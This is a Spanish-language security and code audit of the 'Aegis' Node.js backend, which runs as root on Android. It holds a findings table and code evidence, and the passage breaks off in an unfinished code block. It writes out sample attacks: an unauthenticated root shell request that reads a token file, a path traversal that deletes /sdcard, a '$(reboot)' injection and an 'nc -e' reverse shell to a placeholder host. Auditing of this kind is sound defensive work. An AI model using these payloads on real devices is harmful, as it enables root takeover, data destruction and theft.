# AUDITORÍA COMPLETA DEL BACKEND — PROYECTO AEGIS

**Fecha:** 2026-09-23
**Alcance:** `/sdcard/projects/Aegis/backend/` — `server.js` (2553 líneas), `providers.js` (1648 líneas), `src/core/`, `src/adapters/`, `src/api/`, `src/agents/`, `src/skills/`, `src/plugins/content/`, scripts de operación y documentación (`BACKEND_ARCHITECTURE.md`, `FRONTEND_CONTRACT.md`, `AEGIS_QA.md`).
**Excluido:** `graphify-out/`, `*.log`, `node_modules/`, carpeta `agents/` (vendor), `.git/`.
**Metodologías aplicadas:** Backend Architect, Code Reviewer, AppSec Engineer (OWASP Top 10 / ASVS), API Tester (contrato + OWASP API Security Top 10), Database Optimizer (integridad/atomicidad de persistencia).
**Modo:** solo auditoría — NO se modificó ningún código.

---

## 1. RESUMEN EJECUTIVO

**Puntuación global: 3,5 / 10**

| Dimensión | Nota | Comentario |
|---|---|---|
| Seguridad | **1,5 / 10** | API root sin autenticación escuchando en `0.0.0.0`, RCE directa, path traversal con borrado arbitrario de directorios, múltiples inyecciones de shell. |
| Bugs / Corrección | **4 / 10** | La capa de persistencia tiene buenas ideas (mutex + escritura atómica), pero hay rutas que responden dos veces, handlers que revientan después de responder, promesas no manejadas y peticiones colgadas. |
| API / Contrato | **3,5 / 10** | Existe envelope `{ok,data}`, pero sin versionar, errores heterogéneos, endpoints del contrato ausentes y fallback SPA que devuelve HTML `200` a rutas API inexistentes. |
| Arquitectura | **3 / 10** | Hub monolítico (server.js 2553 líneas) conviviendo con una arquitectura modular `src/` mayoritariamente **desconectada y duplicada** (Strangler Fig a medias). |
| Persistencia | **5 / 10** | `FileMutex` + tmp/fsync/rename son sólidos en papel, pero hay escrituras que se saltan el mutex, campos perdidos, y la atomicidad asumida sobre `/sdcard` (FUSE) es discutible. |
| Observabilidad / Ops | **3,5 / 10** | `logger.js` y `eventBus` existen pero **nadie los usa**; logs sin rotación; keepalive con patrones de proceso obsoletos; cero tests. |

**Veredicto:** el backend funciona como POC doméstico con ingeniería sorprendentemente cuidadosa en trozos aislados, pero **no es apto para exponerse en una red** (ni siquiera la LAN doméstica) en su estado actual. El hallazgo dominante es único y claro: **cualquier dispositivo de la red Wi‑Fi puede ejecutar comandos como root en el teléfono** vía `POST /api/device/shell`, sin token alguno. Además, la mitad del código de `src/` es código muerto duplicado que engaña sobre el estado real del sistema.

**Totales:** 55 hallazgos → **4 CRÍTICOS, 13 ALTOS, 26 MEDIOS, 12 BAJOS.**

---

## 2. TABLA DE HALLAZGOS

| ID | Sev. | Archivo:Línea | Descripción | Fix propuesto |
|---|---|---|---|---|
| SEC-01 | **CRÍTICA** | server.js:2109-2118, 2522, 484-486 | `POST /api/device/shell` ejecuta **cualquier comando como root** (`su -c`/`nsenter`) sin autenticación, con CORS `*`, y el servidor escucha en `0.0.0.0:8765` → RCE root remota desde cualquier host de la LAN. | Binding por defecto `127.0.0.1`; middleware de token (header `Authorization: Bearer`) obligatorio para todo `/api/device/*`; allowlist de comandos o eliminar el endpoint en producción. |
| SEC-02 | **CRÍTICA** | server.js:832-855, 116; providers.js:902-937 | Path traversal en `DELETE /api/sessions/:id`: `sanitizeProjectId` solo hace `trim()`, `decodeURIComponent` reintroduce `/`, y `path.join(brainDir, sid)` + `fs.rmSync({recursive,force})` permite borrar **cualquier directorio** (p. ej. `sid=..%2F..%2F..%2F..%2Fsdcard`) como root. | Validar `sid` con `/^[a-zA-Z0-9_-]+$/`, resolver con `path.resolve` y exigir `resolved.startsWith(brainDir + path.sep)` antes de `rmSync`. |
| SEC-03 | **CRÍTICA** | server.js:2121, 2129, 2138, 2266, 2313/2327, 2382 | Inyección de comandos en `/api/device/launch` (`pkg`/`activity` sin validar), `/api/device/input` (`text` sin escapar `;`, `$(...)`), `/api/device/apps?q=` (sustitución de comando dentro de comillas dobles), `queryContacts` (`q` solo escapa comillas simples) y rutas del asistente (`slots.app`). | `spawn` con arrays de argumentos (sin shell), o allowlist estricta (`^[a-zA-Z0-9._:-]+$`) + escaping POSIX completo en todo input. |
| SEC-04 | **CRÍTICA** | SkillManager.js:33, 49; skillsRoutes.js:15-48 | `POST /api/skills/install` y `DELETE /api/skills/:id` ejecutan `sh -c "npm install -g ${skillId}"` con `skillId` del cliente → **inyección de shell como root** vía endpoint montado. | Validar `skillId` contra `/^[a-z0-9@/._-]+$/` y ejecutar `spawn("npm", ["install","-g",skillId])` sin shell. |
| SEC-05 | ALTA | server.js:1449-1473, 121-132, 274 | `POST/PATCH /api/projects` no valida `name`: `path.join(PROJECTS_ROOT, "../x")` crea directorios y escribe `.ponytail.md` **fuera del workspace**; además `loadPonyTailContext` leerá ese archivo y lo inyectará en el prompt del sistema. | Sanear nombre (`[^a-zA-Z0-9 _-]` → `_`), rechazar `..`, y verificar que `path.resolve(dir).startsWith(WORKSPACE_ROOT + "/")`. |
| SEC-06 | ALTA | server.js:1333; keepalive.sh:117; start-hub.sh:16 | `opencode serve --hostname 0.0.0.0` expone el daemon de IA (con acceso a ficheros y shell) en **todos los interfaces sin auth**. | Cambiar a `127.0.0.1`; el hub ya hace de proxy local. |
| SEC-07 | ALTA | server.js:722-2505 (global), 484-486 | Ninguna ruta exige autenticación/autorización; CORS `Access-Control-Allow-Origin: *` + `Allow-Headers: *` permite que cualquier web abierta en el dispositivo o en la LAN invoque toda la API root. | Token estático generado en primer arranque + middleware global; restringir CORS al origen de la app. |
| SEC-08 | ALTA | server.js:313-318; providers.js:1186-1192 | El bloque de contexto inyectado dicta explícitamente `--dangerously-skip-permissions / auto-approve` y `nsenter` a todos los agentes; combinado con SEC-01/SEC-07 = agentes LLM con auto-aprobación ejecutando como root sin supervisión. | Modo permisos por proyecto, denegación por defecto y confirmación para operaciones destructivas. |
| SEC-09 | MEDIA | providers.js:803-817 | `cleanupZombieProcesses` parsea `/proc/<pid>/stat` con `split(" ")` sin manejar espacios/paréntesis en `comm` → campos `state`/`tty_nr` desalineados → puede hacer `SIGKILL` a procesos `agy` **vivos** de otros usuarios/sesiones. | Reusar el parsing seguro de `getProcessUptime` (`lastIndexOf(")")`) y exigir coincidencia exacta de argv. |
| SEC-10 | MEDIA | server.js:2167-2178, 2262-2290 | Exfiltración trivial de PII por LAN: `GET /api/device/screenshot` devuelve captura Base64 y `queryContacts` consulta la agenda con un solo request. | Mismos controles de SEC-01 (token + localhost). |
| SEC-11 | MEDIA | server.js:1235-1241 | Reparación de accesibilidad: valores leídos de `settings` se reinyectan en `settings put ... ${parts.join(":")}` vía shell sin sanitizar → inyección si un nombre de servicio contiene metacaracteres. | Validar cada segmento con allowlist antes de escribir. |
| SEC-12 | MEDIA | server.js:185-197, 1723-1726 | `listSkills(scope)` hace `path.join(SKILLS_ROOT, scope)` sin sanitizar (`?scope=../../..`) — hoy latente porque la ruta legacy está interceptada (BUG-25), pero activa en cuanto se reordene el router. | Aplicar `skillPath()` también en el GET y validar existencia de `scope`. |
| SEC-13 | MEDIA | server.js:664, 678-696 | `MAX_JSON_BODY = 55 MB` aceptable por request sin auth ni rate-limit → DoS de memoria/GC en host móvil; tras `reject` hace `req.destroy()` y una respuesta que nunca llegará al cliente. | Bajar límite (8-16 MB) para JSON, streaming o referencia externa para imágenes grandes, y devolver `413` antes de destruir. |
| SEC-14 | BAJA | server.js:219, 223-229, 2002-2007 | `readSummary`/`writeSummary` usan el `id` de la URL en `path.join(SUMMARIES_DIR, ...)` sin validar (el sufijo `.summary.json` limita el daño). | Validar id con `genProjectId`-like regex. |
| SEC-15 | BAJA | server.js:2114 | `[shell] ${cmd}` vuelca el comando completo (posibles secretos/PII) a `hub.log` sin rotación. | Truncar y redactar; rotación de logs. |
| BUG-01 | **ALTA** | skillsRoutes.js:11; projectRoutes.js:12,20,32,41,54,64; server.js:484-488, 734-735, 2491-2504 | **Contrato de retorno roto:** los routers modulares hacen `return jsonHelper(...)` pero `json()` no devuelve nada → el `if (handle…()) return;` de server.js **no corta** → la request sigue hasta el handler legacy o al fallback estático que intenta `writeHead(200)` de nuevo → `ERR_HTTP_HEADERS_SENT` como *unhandled rejection* **en cada request a rutas modulares**. | Hacer que `send/json` devuelvan `true` o que cada handler devuelva explícitamente `true` tras responder (patrón ya usado en projectRoutes:51). |
| BUG-02 | **ALTA** | server.js:2495-2499 | El fallback SPA sirve `index.html` con **200** para cualquier ruta desconocida → `POST /api/opencode/sessions` (contrato §3.3), `/api/agents`, `/api/jobs`… devuelven HTML; el cliente Android rompe en `JSON.parse`. | Devolver `404` JSON para todo lo que empiece por `/api/` o `/opencode/`; limitar el fallback SPA a rutas de navegación sin extensión. |
| BUG-03 | **ALTA** | server.js:20-21, 734-735 | Solo `skillsRoutes` y `projectRoutes` están importados/montados. `agentRoutes`, `contentRoutes`, `jobRoutes`, `workflowRoutes` **nunca se registran** → endpoints del Control Center (`/api/agents`, `/api/jobs`, `/api/workflows/:id/run`, `/api/content/status`) inexistentes → métricas de "agentes/jobs" que exige `AEGIS_QA.md` (TEST-02) no pueden funcionar. | Importar y montar los 4 routers en server.js (junto con BUG-01). |
| BUG-04 | **ALTA** | ClaudeCodeAdapter.js:7; taskClassifier.js:9 | `ClaudeCodeAdapter` importa `../core/normalizer.js` que **no existe** (crash de import si se usa), y `taskClassifier` recomienda el adapter `claudecode` que `ProviderManager` jamás registra → fallback silencioso a Antigravity. | Crear `normalizer.js` (o importar de `providers.js`), registrar el adapter y validar en arranque que todo adapter recomendado está registrado. |
| BUG-05 | **ALTA** | server.js:914-921; providers.js:1567-1570 | Ruteo de proveedor: el `if/else` tiene **ambas ramas idénticas** (`provId = "antigravity"`), y `resolveProvider` da prioridad al explícito → sesiones de OpenCode **sin header `X-Provider` se enrutan a la CLI de Antigravity**; el `provider` guardado en `projects.json` se ignora. | Eliminar el `else` muerto: tomar `provId` de `sessionEntry.provider`/`proj.provider` antes de caer a default; solo pasar explícito si lo dijo el cliente. |
| BUG-06 | **ALTA** | server.js:988-990; providers.js:559-573 | Si el body no trae `model`, se fuerza `"gemini-3.8-flash-high"` a **toda** sesión; en OpenCode el adapter lo convierte en `{providerID:"opencode", modelID:"gemini-3.8-flash-high"}` → el daemon rechaza con 400. | Default por proveedor: nada para OpenCode (que use su modelo por defecto), gemini solo para Antigravity. |
| BUG-07 | **ALTA** | projectRoutes.js:27-33; pathResolver.js:14-33; projects.json:5 | `GET /api/workspace/projects/:id/state` **sin try/catch**: `getProjectAbsPath` lanza para ids inválidos — y los proyectos reales tienen **espacios** (`"Agencia de Marketing"`, `id = nombre de carpeta` en `scanWorkspace`) → excepción no capturada dentro del handler → **petición colgada** hasta el timeout de 135 s. | Envolver en try/catch (como ya hace el branch `init`), o alinear `isValidProjectId` con los nombres reales de carpeta. |
| BUG-08 | **ALTA** | projectRoutes.js:46-55; projectManager.js:79-107 | `manager.indexProject(id, res)` **sin `await`**: el `try/catch` no captura nada, se hacen `writeHead(SSE)` **antes** de validar el id, y si `SkillInvoker` rechaza la conexión **nunca cierra** (`res.end()` no alcanzado) → cliente colgado + unhandled rejection. | `await` + validar id antes de escribir cabeceras + `finally { res.end(); }`. |
| BUG-09 | ALTA | server.js:1804-1807 | `POST /api/projects/:id/summarize` muta `store` y llama `saveProjectsStore` **fuera del `fileMutex`** → *lost update* garantizado ante escrituras concurrentes (rename/DELETE de sesiones). | Envolver la mutación en `fileMutex.runExclusive(PROJECTS_STORE_FILE, …)`. |
| BUG-10 | ALTA | server.js:740-759; providers.js:1530-1543 | `POST /api/providers/default` escribe `providers.json` con `fs.writeFileSync` **sin mutex ni tmp+rename** y regenera `providers` desde `listProviders()` → **pierde los campos `description`/`enabled`** del archivo; `ProviderManager.saveConfig` (que sí es atómico) está muerto. | Usar `providerManager.saveConfig()` en lugar de escritura manual. |
| BUG-11 | ALTA | server.js:56-58, 47-55 | `saveUiState` usa `writeFileSync` no atómico (crash a mitad de escritura = JSON corrupto y pérdida del proyecto activo); y la carga hace un doble `try` donde **si el primer parse tiene éxito no se aplican los defaults** (el segundo bloque es código muerto). | `atomicWriteFileSync` + un único merge `{...base, ...raw}`. |
| BUG-12 | ALTA | server.js:1594-1608 | `adapter.createSession(...)` (HTTP/CLI de hasta 8 s) se ejecuta **dentro del `fileMutex` global** → cualquier cuelgue del proveedor bloquea *toda* lectura/escritura de `projects.json` (todas las rutas de proyectos y sesiones). | Resolver la sesión fuera del lock y entrar al mutex solo para el push. |
| BUG-13 | ALTA | providers.js:604-626, 645-652 | El *poll* de `OpencodeAdapter.sendMessage` (1 s × 45 s) no se detiene si el cliente aborta (el listener abort ve `resolved=true` y sale) → interval huérfano peticionando durante 45 s tras la desconexión; al agotar devuelve mensaje **vacío con status `SENT`** → el UI muestra una respuesta fantasma como éxito. | Guardar el `pollTimer` y limpiarlo en el handler de abort; devolver `status:"ERROR"` en timeout. |
| BUG-14 | ALTA | providers.js:908, 906-918 | `AntigravityAdapter.deleteSession` llama `loadProjectsStore()` que **no está definida ni importada en providers.js** → `ReferenceError` tragado por el `catch(_){}` → la purga de directorios brain vía `agyConversationId` **nunca se ejecuta** (fuga de datos huérfanos en `/root/.gemini/…/brain`). | Inyectar el store o devolver la purga a server.js; loguear el error en vez de silenciar. |
| BUG-15 | ALTA | skillsRoutes.js:11 vs server.js:1720-1729 | **Doble implementación de `GET /api/skills` con shapes distintos**: skillsRoutes devuelve `{ok,data:[…nombres]}` y, como no corta (BUG-01), la legacy *también* intenta responder `{ok,data:{skills,projectId,counts}}` y revienta en `writeHead`. El cliente recibe un shape u otro según el orden → contrato inestable. | Unificar en una sola implementación; eliminar la legacy tras validar uso. |
| BUG-16 | ALTA | server.js:762 vs FRONTEND_CONTRACT.md:136 | El contrato define `POST /api/opencode/sessions` pero el handler solo acepta `/opencode/session` y `/api/sessions` → el endpoint del contrato cae al fallback SPA y devuelve **HTML 200**. | Añadir `/api/opencode/sessions` a la condición (alias barato). |
| ARQ-01 | **ALTA** | providers.js (global) vs src/adapters/* | **Duplicación total:** `src/adapters/OpenCodeAdapter.js` (544) y `AntigravityAdapter.js` (758) son copias "verbatim" de `providers.js`, y encima **importan de vuelta** `../../providers.js` (OpenCodeAdapter.js:7, AntigravityAdapter.js:9) → dependencia circular y código muerto que puede divergir silenciosamente de la implementación real (el runtime usa `providers.js`). | Completar el Strangler: extraer `normalizeMessage` a `src/core/normalizer.js`, que los adaptadores y `providers.js` importen; borrar las copias. |
| ARQ-02 | **ALTA** | server.js:1-2553 | **Monolito:** router if-chain de ~1800 líneas dentro del callback de `createServer`, con helper `directIntentOf`/`queryContacts`/`executeAssistantAction` **redefinidos en cada request** (2237-2447) — el propio código documenta que el bug de "VOICE definido dentro del callback" ya ocurrió una vez (2011-2012) pero persiste para el asistente. | Extraer a módulos (`src/api/deviceRoutes`, `src/api/assistantRoutes`), subir helpers a scope de módulo. |
| ARQ-03 | ALTA | server.js:67-87/715-720; projectManager.js:11-35 | **Tres fuentes de verdad de "proyecto"** conviviendo: escaneo de carpetas (`listProjects`, `?source=fs`), `projects.json` (companion) y estado `.hub/` (`scanWorkspace`) con shapes distintos. | Consolidar en `projects.json` como única fuente; la vista FS pasa a ser un *reconciler*. |
| ARQ-04 | MEDIA | src/core/jobScheduler.js, modelRouter.js, taskClassifier.js, workflowEngine.js, src/plugins/content/* | Código modular **no cableado**: `jobScheduler.start()` y `initContentPlugin()` jamás se llaman; `modelRouter`/`taskClassifier` no se usan en server.js; `workflowEngine` solo es referenciado por el router no montado. | Montar o retirar; registrar arranque explícito (`bootstrap()`). |
| ARQ-05 | MEDIA | eventBus.js; agentPool.js:34 | `eventBus` **no tiene ni un suscriptor** (grep 0): todos los eventos `AGENT_*`/`WORKFLOW_*`/`ARTIFACT_CREATED` se emiten al vacío; `dispatch` es *fire-and-forget* sin `.catch` → unhandled rejections potenciales. | Suscribir logger/metricas al bus; añadir `.catch` y propagar estado real. |
| API-01 | ALTA | FRONTEND_CONTRACT.md:106-129 vs server.js:1978 | Contrato §3.2 dice que `GET …/messages` devuelve **array crudo**; la implementación devuelve `{ok,data:[…]}` (BACKEND_ARCHITECTURE §4.2). Docs canónicos en desacuerdo → clientes rompen. | Regenerar `FRONTEND_CONTRACT` v1.3 con el envelope real y compat dual documentada. |
| API-02 | ALTA | server.js (global), package.json | Sin **versionado** (`/api/v1`), sin `401`, sin `429` (rate limiting), sin `X-Request-Id`/correlación, sin OpenAPI; el `202 {"status":"queued"}` del contrato §3.1 **no existe**. | Prefijo `/api/v1`, middleware de rate-limit por IP, envelope de error `{ok:false,error,code}` ÚNICO (hoy hay respuestas con `{error}` crudo: device 2113/2117, ui-state 1376, static 2498). |
| API-03 | MEDIA | server.js:777 vs FRONTEND_CONTRACT.md:137 | El contrato envía `project_id` (snake_case) en la creación de sesión; el servidor solo lee `body.projectId` → vínculo silenciosamente ignorado. | Aceptar ambos alias y documentarlo. |
| API-04 | MEDIA | server.js:583-584, 588-592, 632-637 | Timeouts del proxy por debajo del contrato: guard de **60 s** en rutas inyectadas y **8 s** en el path no inyectado (aplica a `prompt`/`chat` y a POST message **sin `Content-Length`**, que no intenta inyección) vs **90 s** prometidos → 502 prematuro. | Unificar el presupuesto de timeouts en 90 s y habilitar inyección también en bodies chunked. |
| API-05 | MEDIA | server.js:2039-2097, 2099-2108 | `GET /api/health` ejecuta `df`, escanea `/proc`, sondea 8766 y hasta `su -c id` (`/api/status`) — healthchecks **pesados** sin caché → el keepalive los invoca cada 10 s (spawning root shells de forma perpetua). | Healthcheck ligero (`/api/ping` sin shell) para sonda; el detallado bajo demanda. |
| DATA-01 | MEDIA | server.js (múltiples rutas), docs/BACKEND_ARCHITECTURE.md:112-116 | `projects.json` se lee y **re-parsea síncronamente en cada request** (rutas de mensajes con polling de 1,5 s) → bloquea el event loop; sin caché con invalidación por mutex. | Caché en memoria con invalidación al final de cada `runExclusive`, o migrar a SQLite. |
| DATA-02 | MEDIA | docs/BACKEND_ARCHITECTURE.md:112-116 vs realidad | La doc afirma que `rename` es atómico "incluyendo el almacenamiento montado en Android", pero `/sdcard` es **FUSE/emulated** (vfat-like): `fsync` puede ser no-op y `rename` no está garantizado a nivel de crash. | Mover stores críticos a almacenamiento privado (`/data/data/…`) o usar SQLite con WAL; fsync también del directorio (`fsync(dirfd)`). |
| DATA-03 | MEDIA | server.js:67-111 | Duplicidad de títulos: `store.sessionTitles[...]` y `session[].title` se mantienen en dos sitios; el *seed* al cargar (78-84) puede resucitar títulos viejos si diffieren. | Un solo mapa canónico + índice derivado. |
| OPS-01 | MEDIA | keepalive.sh:126; start-hub.sh:11-12 | Los patrones de detección siguen apuntando a `opencode-companion/server.js`, pero el directorio real es `Aegis/backend` → **nunca detecta/ mata el hub stale**; `start-hub.sh` mata "previos" con patrón que no matchea. | Actualizar patrones a `Aegis/backend/server.js` (o detectar por puerto con `lsof`). |
| OPS-02 | MEDIA | keepalive.sh:46-58, 64-70, 89-111 | Lock con TOCTOU (leer-then-escribir) → doble instancia posible; e `is_up` decide con `grep -qi "opencode"` sobre el **body** de `GET /` → un cambio de banner dispara el kill del serve sano. | `mkdir` como lock atómico; sonda por `/global/health` JSON. |
| OPS-03 | MEDIA | keepalive.sh:10, 40, 136; server.js:1333 | `keepalive.log`, `hub.log`, `opencode.log` se abren con `>>` **sin rotación ni límite** en `/sdcard` → riesgo de disco lleno (el propio healthcheck reporta `df`); archivos `.log` huérfanos ya acumulados en el repo. | `logrotate`-simple por tamaño en el propio loop o `copytruncate`. |
| OPS-04 | MEDIA | server.js:1330-1343 | `ensureOpencode` persiste como companion-owned el PID de `nohup … & echo $!`, que es el PID del **shell**, no del proceso opencode → clasificación de propiedad incorrecta → posible lanzamiento duplicado posterior. | Persistir el PID real (leer `/proc` tras arrancar o usar `exec` en el shell). |
| OPS-05 | MEDIA | server.js:30-33 | Graceful shutdown limitado: `SIGTERM` cierra el listener en ≤2 s pero no espera requests en vuelo, no detiene `jobScheduler`, no purga procesos `agy` de `activeProcesses` ni hace flush de estado. | Drenar conexiones (`server.close` + lista de sockets), `jobScheduler.stop()`, kill de procesos hijos, timeout duro final. |
| OPS-06 | MEDIA | server.js:893-1092 | En `POST …/message` hay **3 transacciones** secuenciales sobre `projects.json` más `loadProjectsStore()` repetido 3 veces por mensaje → bajo el polling del cliente es mucho I/O síncrono por turno. | Consolidar en una única lectura/escritura por request. |
| OBS-01 | MEDIA | src/core/logger.js (0 usos fuera de su archivo) | `Logger` con niveles y buffer existe pero server.js/providers.js usan `console.log` crudo: sin estructura JSON, sin request-id, sin niveles configurables. | Adoptar `createLogger` globalmente; formato NDJSON. |
| OBS-02 | MEDIA | src/core/jobScheduler.js:11-24; jobRoutes.js (no montado) | Los jobs **no existen en runtime** (`start()` nunca llamado), por lo que aunque BUG-03 se arregle, `/api/jobs` devolvería `[]` siempre. | Registrar jobs reales (health-agente, limpieza brain, backup) y arrancar en bootstrap. |
| TEST-01 | ALTA | package.json:6-10 | **Cero tests, cero lint, cero CI**, `dependencies: {}` sin `devDependencies` — cobertura de API efectiva 0 % frente al objetivo 95 % de la metodología API Tester; los contratos solo se validan a mano. | Vitest + tests de contrato (supertest contra server real) para cada ruta del FRONTEND_CONTRACT. |
| DOC-01 | MEDIA | server.js:1236 vs docs/AEGIS_QA.md | Reparación de a11y escribe el componente con el **paquete legado** (`…OpencodeAccessibilityService`) mientras el QA/distribución instala **`com.aegis.hub`** → la reparación automática apunta a un paquete que ya no existe. | Centralizar `APP_PACKAGE` en config y usarla en a11y repair, whitelist y docs. |
| DOC-02 | MEDIA | docs/BACKEND_ARCHITECTURE.md:215 | Doc dice lock en `/sdcard/projects/opencode-companion/keepalive.lock` — path real `/sdcard/projects/Aegis/backend/keepalive.lock`; diagrama/endpoint names (`/api/system/health` ok) y versiones (contract 1.2.0 vs arch 2.0.0) desalineados. | Sincronizar docs en la misma PR que cambie rutas. |
| BAJA-01 | BAJA | server.js:156-163 | `VOICE_LOG` solo en memoria pese al endpoint `GET /api/voice/log` (se pierde en cada reinicio del hub, que ocurre cada ~10 s si keepalive decide). | Persistir con `atomicWriteFileSync` acotado. |
| BAJA-02 | BAJA | server.js:24-25 vs 1381-1382 | `ok`/`fail` declarados dos veces (módulo y callback) — duplicidad muerta. | Borrar la inner. |
| BAJA-03 | BAJA | providers.js:153-157, 1487-1489 | `_agyMeta` se propaga al cliente aunque el propio código declara "nunca fugar campos debug" (server.js:564); el contrato no lo define. | Strip en `normalizeMessage` salvo flag interno. |
| BAJA-04 | BAJA | providers.js:98-103, 294-298 | `info.timestamp` puede terminar como string ISO según la fuente, mientras el contrato Kotlin espera `Long` → riesgo de fallo de parse en Android. | Coerción a epoch numérico dentro de `normalizeMessage`. |
| BAJA-05 | BAJA | providers.js:1594-1624 | `getUnifiedMessages` consulta ambos adapters **secuencial** con timeouts de 15 s → `GET …/messages` puede tardar 30 s bajo un polling de 1,5 s. | `Promise.allSettled` con timeout global (2 s) y caché de transcript. |
| BAJA-06 | BAJA | agentPool.js:47-50 | `cancelAll` devuelve `{ok:true,message:"All agents cancelled"}` pero **no cancela nada** (sin señal ni AbortController) — API que miente. | Propagar `AbortSignal` a `execute`. |
| BAJA-07 | BAJA | workflowEngine.js:16-20 | El "secuencial" no espera pasos (`dispatch` retorna ya) y el límite de 2 agentes/proyecto (agentPool.js:26) haría fallar cualquier workflow de >2 pasos; `WORKFLOW_COMPLETED` se emite antes de tiempo. | Encadenar promesas reales de `execute` o suscribirse a `AGENT_COMPLETED`. |
| BAJA-08 | BAJA | server.js:697 vs 2115/2172/2184/2267 | `runShell(cmd, timeout)` ignora el tercer argumento `maxBuffer` que varias rutas le pasan → parámetro muerto (funciona solo por el default de `shellExecRaw`). | Aceptar y propagar `maxBuffer`. |
| BAJA-09 | BAJA | contentRoutes.js:6-8; moneyPrinterAdapter.js | `/api/content/status` (inmontado) es todo lo que existe del "plugin de contenido": `generateVideo` devuelve `video.mp4` hardcodeado (stub). | Marcar como experimental o eliminar del alcance. |
| BAJA-10 | BAJA | providerManager.listProviders (providers.js:1553-1564); server.js:737-739 | `enabled` de `providers.json` se ignora en runtime: un proveedor deshabilitado sigue resoluble. | Filtrar por `enabled` en `get/resolveProvider`. |
| BAJA-11 | BAJA | server.js:897-898 | Detección de streaming solo por `?stream=true` o `Accept: text/event-stream`; si el cliente usa `fetch` con reader sin Accept SSE, nunca verá chunks. | Documentar o ampliar detección. |
| BAJA-12 | BAJA | docs/AEGIS_QA.md (1 línea) | El "documento de QA" no es QA: es un runbook de 20 tareas (descarga APK, pruebas ARTEMIS, commit) empaquetado como doc, sin resultados, sin matriz de bugs — las "promesas de QA" no son verificables desde ahí. | Separar `QA_PLAN.md` (runbook) de `QA_REPORT.md` (resultados, ya existe en `Aegis/docs/`). |

---

## 3. BUGS CONFIRMADOS CON EVIDENCIA DE CÓDIGO

### 🔴 C1 — RCE root sin autenticación (SEC-01) *(CRÍTICO)*
```js
// server.js:2109-2117
if(pathname==="/api/device/shell" && req.method==="POST"){
  const { cmd, timeout, maxBuffer } = JSON.parse(raw||"{}");
  if(!cmd) return json(res, 400, { error:"cmd requerido" });
  const out = await runShell(cmd, timeout || 20000, maxBuffer || MAX_BUFFER); // su -c / nsenter root
// server.js:2522
server.listen(HUB_PORT, "0.0.0.0", async ()=>{ ... });
// server.js:485
res.writeHead(code, { "Access-Control-Allow-Origin":"*", ... });
```
**Por qué es explotable:** cualquier host de la LAN (o un navegador con una web maliciosa abierta en el propio teléfono, gracias a CORS `*`) envía `POST http://<ip>:8765/api/device/shell {"cmd":"cat /data/data/.../shared_prefs/token.xml"}` y obtiene salida como root. `runShell` envuelve con `su -c`/`nsenter -t 1 -m` (server.js:697-714), así que es root real. Fix: 127.0.0.1 + token obligatorio.

### 🔴 C2 — Borrado arbitrario de directorios por path traversal (SEC-02) *(CRÍTICO)*
```js
// server.js:116
function sanitizeProjectId(v) { return String(v || "").trim(); }   // ¡solo trim!
// server.js:832-834
const deleteSessionIntercept = pathname.match(/^\/(?:api\/opencode|opencode|api)\/session(?:s)?\/([^\/]+)$/);
const sid = sanitizeProjectId(decodeURIComponent(deleteSessionIntercept[1]));  // %2F → '/'
// server.js:853-855
let isAgy = sid.startsWith("agy_") || antigravityAdapter.sessionMap.has(sid) ||
            fs.existsSync(path.join(antigravityAdapter.brainDir, sid));   // ../../.. resuelve fuera
// providers.js:920-923
const targetDir = path.join(this.brainDir, convId);
if (fs.existsSync(targetDir)) { fs.rmSync(targetDir, { recursive: true, force: true }); }
```
`DELETE /api/sessions/..%2F..%2F..%2F..%2Fsdcard` → `existsSync("/sdcard")` verdadero → `isAgy=true` → `rmSync("/sdcard", {recursive,force})` **como root**. Fix: regex estricta de sid + verificación `resolve().startsWith(brainDir + sep)`.

### 🔴 C3 — Inyección de shell en múltiples rutas "de UI" (SEC-03) *(CRÍTICO)*
```js
// server.js:2129 — ; y $(...) sin escapar
const esc = String(text||"").replace(/ /g,"%s").replace(/&/g,"\\&");
const out = await runShell(`input text ${esc}`);
// server.js:2138 — sustitución de comando dentro de "..." en shell
const out = await runShell(`pm list packages ${q ? `-3 | grep -i ${JSON.stringify(q)}` : ""} ...`);
// server.js:2266 — $(...) activo dentro de las comillas dobles del --where
const cmd = `content query ... --where "display_name LIKE '%${safe}%' ...`;   // safe solo duplica ' 
// server.js:2327 — slots.app llega del texto libre del asistente
const amCmd = `am start ... -p ${pkgFinal} ...`;
```
`JSON.stringify` escapa `"` pero **no** `$(…)` ni backticks → `GET /api/device/apps?q=$(reboot)` ejecuta. Fix: arrays vía `spawn` sin shell.

### 🔴 C4 — `npm install -g` con input del cliente vía `sh -c` (SEC-04) *(CRÍTICO)*
```js
// SkillManager.js:32-34 (endpoint montado: skillsRoutes.js:15)
install(skillId) {
  const cmd = `npm install -g ${skillId}`;
  const p = spawn("sh", ["-c", cmd], ...);
```
`{"skillId":"x; toybox nc -e /system/bin/sh <lan> 4444"}` → root shell rev. Fix: allowlist + `spawn("npm",[...])`.

### 🟠 C5 — Los routers modulares no cortan la cadena (BUG-01) *(ALTO)*
```js
// server.js:484-488
function send(res, code, body, headers={){ res.writeHead(...); res.end(body); }  // → undefined
function json(res, code, obj){ send(...); }                                     // → undefined
// skillsRoutes.js:11
if (pathname === "/api/skills" && req.method === "GET") {
  return jsonHelper(res, 200, { ok: true, data: manager.listInstalled() });     // undefined ⇒ falso
// server.js:734
if (handleSkillsRoute(req, res, pathname, json, readJsonBody)) return;          // NO corta
// ⇒ server.js:1720 ejecuta la OTRA implementación de GET /api/skills y su
//    writeHead revienta con ERR_HTTP_HEADERS_SENT (unhandledRejection vía línea 31);
// ⇒ rutas /api/workspace/* caen al fallback estático server.js:2503 res.writeHead(200)
```
Evidencia interna de que el patrón se conoce: `projectRoutes.js:51` devuelve `true` explícitamente ("Sent headers already"), pero el resto de handlers no lo hace. **Consecuencia operativa:** cada `GET /api/skills` y cada `/api/workspace/*` genera una excepción registrada por el manejador global (server.js:31) que la "resiliencia" oculta — los logs del hub están llena de estos errores.

### 🟠 C6 — El fallback SPA contamina la API (BUG-02 + BUG-03) *(ALTO)*
```js
// server.js:2495-2499
if(!fs.existsSync(fp)){
  const idx = path.join(__dirname,"public","index.html");
  if(fs.existsSync(idx)) fp = idx; else return json(res,404,{error:"not found", path:pathname});
}
res.writeHead(200, {"Content-Type": mime, ...});   // HTML 200 para POST /api/opencode/sessions
```
Combinado con los routers no montados (server.js:20-21 importa solo skills+project), **cualquier endpoint inexistente responde `200 text/html`**, incluidos `POST /api/opencode/sessions` (FRONTEND_CONTRACT §3.3), `GET /api/agents` y `GET /api/jobs` (que el Control Center de AEGIS_QA TEST-02 espera). El Android recibe HTML donde espera JSON.

### 🟠 C7 — Proveedor y modelo default mal ruteados (BUG-05/06) *(ALTO)*
```js
